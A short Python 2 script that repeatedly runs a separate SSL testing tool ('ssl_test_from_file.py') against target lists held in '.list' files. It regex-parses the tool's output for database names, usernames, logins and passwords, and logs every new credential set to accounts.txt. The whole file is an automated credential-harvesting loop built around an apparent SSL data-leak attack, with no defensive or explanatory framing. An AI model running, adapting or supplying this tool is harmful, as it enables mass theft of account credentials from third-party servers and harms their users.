#!/usr/bin/env python


import os
import re
import time

accounts = []
f_list = os.listdir("./")
while True:
    for file in f_list:
        if os.path.splitext(file)[1] == '.list':
            cmd = "./ssl_test_from_file.py --file=%s" % file
            print cmd
            result = os.popen(cmd).read()
            print result
            matches = re.findall('"db":"(.*?)","user":"(.*?)","login":"(.*?)","password":"(.*?)"', result)
            for match in matches:
                if match not in accounts:
                    accounts.append(match)
                    with open('accounts.txt', 'a') as inFile:
                        inFile.write(str(match) + '\n')
                        print 'New Account:', match
        time.sleep(1.0)